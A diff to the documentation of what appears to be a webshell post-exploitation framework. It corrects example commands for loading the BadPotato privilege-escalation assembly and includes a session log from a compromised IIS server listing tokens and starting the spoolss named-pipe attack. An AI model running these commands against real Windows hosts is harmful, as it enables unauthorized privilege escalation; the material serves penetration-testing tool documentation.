@@ -36,9 +36,9 @@ optional arguments:
   -m M       Method to call inside Assembly.
 
 Examples:
-  execute_assembly -f ~/Kraken/test/net_assemblies/badpotato_net40_x64.exe -n BadPotato -c Program -m call
-  execute_assembly -f ~/Kraken/test/net_assemblies/dummy_net40_x64.exe -n BadPotato -c Program -m call -- Ping
-  execute_assembly -f ~/Kraken/test/net_assemblies/dummy_net40_x64.exe -n BadPotato -c Program -m call -- Ping -h --help
+  execute_assembly -f ~/Kraken/test/net_assemblies/BadPotato_net40_x64.exe -n BadPotato -c Program -m call
+  execute_assembly -f ~/Kraken/test/net_assemblies/dummy_net40_x64.exe -n Dummy -c Program -m Main -- Ping
+  execute_assembly -f ~/Kraken/test/net_assemblies/dummy_net20_x64.exe -n Dummy -c Program -m Main -- Ping -h --help
 
 (ST) IIS APPPOOL\DefaultAppPool@DESKTOP-8D0OEQR:C:/inetpub/wwwroot$ list_tokens
 
@@ -47,7 +47,7 @@ Examples:
   636    nt authority\iusr           True            HIGH
   664    iis apppool\defaultapppool  True            HIGH
 
-(ST) IIS APPPOOL\DefaultAppPool@DESKTOP-8D0OEQR:C:/inetpub/wwwroot$ execute_assembly -f /home/secu/net_assemblies/bin/BadPotato-mod/badpotato_net40_x64.exe -n BadPotato -c Program -m call
+(ST) IIS APPPOOL\DefaultAppPool@DESKTOP-8D0OEQR:C:/inetpub/wwwroot$ execute_assembly -f /home/secu/net_assemblies/bin/BadPotato-mod/BadPotato_net40_x64.exe -n BadPotato -c Program -m Main
 [*] PipeName : \\.\pipe\986aba0ae0e14cdd906d46087e9cbc55\pipe\spoolss
 [*] ConnectPipeName : \\DESKTOP-8D0OEQR/pipe/986aba0ae0e14cdd906d46087e9cbc55
 [*] CreateNamedPipeW Success! IntPtr:2496
